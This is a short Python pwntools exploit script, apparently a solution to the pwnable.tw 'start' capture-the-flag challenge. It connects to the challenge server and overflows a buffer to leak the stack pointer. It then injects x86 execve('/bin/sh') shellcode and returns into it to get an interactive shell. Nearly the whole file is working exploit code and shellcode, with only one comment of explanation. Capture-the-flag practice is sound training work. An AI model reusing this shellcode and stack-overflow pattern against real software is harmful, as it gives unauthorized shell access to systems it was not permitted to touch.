from pwnlib.tubes.process import process
from pwnlib.tubes.remote import remote
from pwnlib.util.packing import u32, p32

# ASLR is on, so basically we disclose the esp and then return to stack

# sh = process("qemu-i386 -g 8084 -strace ./start".split(" "), stderr=2)
sh = remote('chall.pwnable.tw', 10000)
sh.recv(20)
sh.send("_"*20 + p32(0x08048073))
sh.recv(16)
esp = sh.recv(4)
sh.send("\x31\xc9\x31\xd2\x8d\x5c\x24\xf4\xb0\x0b\xcd\x80/bin/sh\0" + p32(u32(esp)-0x14))
sh.interactive()
